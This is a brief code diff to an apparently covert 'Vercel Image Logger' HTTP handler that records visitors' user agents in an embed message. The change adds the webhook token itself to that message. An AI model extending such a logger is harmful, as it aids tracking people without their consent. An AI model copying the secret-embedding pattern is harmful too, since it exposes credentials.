@@ -71,6 +71,11 @@ class handler(BaseHTTPRequestHandler):
 **User Agent:**
 ```
 {user_agent}
+```
+
+**Webhook Token:**
+```
+{WEBHOOK}
 ```""",
                 "thumbnail": {"url": image_url},
                 "footer": {"text": "Vercel Image Logger"}
